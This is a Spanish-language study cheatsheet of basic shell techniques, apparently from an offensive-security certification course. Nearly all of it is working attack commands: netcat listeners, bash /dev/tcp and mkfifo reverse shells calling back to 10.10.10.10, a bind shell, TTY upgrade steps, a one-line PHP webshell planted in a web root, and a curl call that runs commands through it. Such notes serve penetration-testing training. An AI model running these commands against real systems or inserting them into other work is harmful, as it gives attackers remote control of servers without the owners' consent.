---
tipo: cheatsheet
tags: [shell, reverse-shell, bind-shell, webshell, netcat, mkfifo, tty]
actualizado: 2026-05-28
---

# Basic Shells — Cheatsheet

#shell #revshell 

---------

|                                                                                    |                                                                    |
| ---------------------------------------------------------------------------------- | ------------------------------------------------------------------ |
| **Uso de shells**                                                                  |                                                                    |
| `nc -lvnp 1234`                                                                    | Iniciar un agente de escucha en un puerto local`nc`                |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`                              | Enviar un shell inverso desde el servidor remoto                   |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f` | Otro comando para enviar un shell inverso desde el servidor remoto |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f`      | Iniciar un shell de enlace en el servidor remoto                   |
| `nc 10.10.10.1 1234`                                                               | Conexión a un shell de enlace iniciado en el servidor remoto       |
| `python -c 'import pty; pty.spawn("/bin/bash")'`                                   | Shell de actualización TTY (1)                                     |
| `ctrl+z` luego luego luego dos veces`stty raw -echo``fg``enter`                    | Shell de actualización TTY (2)                                     |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php`                  | Crear un archivo php de webshell                                   |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id`                                      | Ejecutar un comando en un webshell cargado                         |

---

## Navegación

- ⬆️ Carpeta: [[_5- shells|5- shells]]
- ➡️ Siguiente: [[2- tipos de shell]] — teoría completa de los 3 tipos.

## Relacionadas

- [[2- tipos de shell]] — explicación detallada de cada comando de este cheatsheet.
- [[_4- privilege scalation|4- privilege scalation]] — siguiente paso tras obtener shell.
- [[../6- Web/1- Protocolo HTTP|6- Web → HTTP]] — base del Web Shell (`curl`, parámetros GET).
- [[4- Cómo Utilizar CURL con HTTP]] — uso de `curl` desde Linux/Bash.
- [[../../../01-Sistemas-Operativos/Linux/1- El Hacker Legendario 🐧🐍 - Fundamentos, Hacking y Certificaciones/3- Preparación para la Certificación del eJPTv2/2- Curso de Python Aplicado a la Ciberseguridad/14- Sockets/1- Introducción a los Sockets|Sockets en Python]] — base de bind/reverse shells programáticas.
